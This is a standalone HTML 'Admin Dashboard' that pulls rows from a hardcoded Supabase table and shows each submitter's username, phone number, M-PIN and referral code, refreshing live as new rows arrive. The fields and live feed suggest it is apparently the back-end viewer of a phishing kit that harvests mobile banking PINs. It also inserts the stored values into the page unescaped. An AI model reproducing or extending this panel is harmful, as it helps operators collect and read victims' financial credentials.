<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
</head>
<body class="bg-gray-100 min-h-screen p-6">
    <div class="max-w-6xl mx-auto">
        <h1 class="text-3xl font-bold mb-6">Admin Dashboard</h1>
        <div class="bg-white rounded-2xl shadow-md overflow-x-auto">
            <table class="w-full text-left border-collapse">
                <thead>
                    <tr class="bg-gray-800 text-white">
                        <th class="p-4">Username</th>
                        <th class="p-4">Phone</th>
                        <th class="p-4">M-PIN</th>
                        <th class="p-4">Referral</th>
                    </tr>
                </thead>
                <tbody id="userTableBody" class="divide-y divide-gray-200">
                    <!-- Data will be loaded here -->
                </tbody>
            </table>
        </div>
    </div>

    <script>
        const SUPABASE_URL = 'https://zvswgqddbeykgrhlovgp.supabase.co';
        const SUPABASE_ANON_KEY = 'sb_publishable_moe4DeFFDoQjVmcCLPtOmQ_VXcW9TyD';
        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

        async function fetchUsers() {
            const { data, error } = await supabase
                .from('messages')
                .select('*')
                .order('id', { ascending: false });

            const tbody = document.getElementById('userTableBody');
            tbody.innerHTML = '';

            if (data) {
                data.forEach(row => {
                    try {
                        const user = JSON.parse(row.content);
                        const tr = document.createElement('tr');
                        tr.innerHTML = `
                            <td class="p-4">${user.username || 'N/A'}</td>
                            <td class="p-4">${user.phone || 'N/A'}</td>
                            <td class="p-4">${user.mpin || 'N/A'}</td>
                            <td class="p-4">${user.referral || 'N/A'}</td>
                        `;
                        tbody.appendChild(tr);
                    } catch (e) {
                        console.error('Error parsing row content:', e);
                    }
                });
            }
        }

        fetchUsers();

        supabase.channel('public:messages')
            .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'messages' }, payload => {
                fetchUsers();
            })
            .subscribe();
    </script>
</body>
</html>
